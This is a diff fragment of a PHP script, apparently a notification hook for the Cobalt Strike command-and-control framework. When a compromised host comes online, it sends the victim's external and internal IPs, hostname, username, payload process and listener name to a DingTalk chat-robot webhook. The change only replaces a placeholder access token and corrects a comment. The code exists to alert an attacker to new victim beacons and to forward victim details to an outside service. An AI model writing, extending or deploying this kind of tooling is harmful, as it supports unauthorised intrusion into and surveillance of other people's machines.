@@ -68,7 +68,7 @@ if(@$_GET['source'] == 'fish'){
     $result = request_by_curl($webhook, $data_string);
 }
 if(@$_GET['source'] == 'fish'){
-    $webhook = "https://oapi.dingtalk.com/robot/send?access_token=自己飞书机器人的Token";//填写飞书webhook地址
+    $webhook = "https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxx";//填写钉钉webhook地址
     $message="CobaltStrike有主机上线啦~"."\r\n出口IP：".$_GET['externalIP']."\r\n内网IP：".$_GET['internalIP']."\r\n主机名：".$_GET['computerName']."\r\n用户名：".$_GET['userName']."\r\n载荷名：".$_GET['Process']."\r\n监听器：".$_GET['Listener']."\r\n时间戳：".$Attacktime."\r\n";
     $data = array ('msgtype' => 'text','text' => array ('content' => $message),'at' => array ('isAtAll' => true));
     $data_string = json_encode($data);
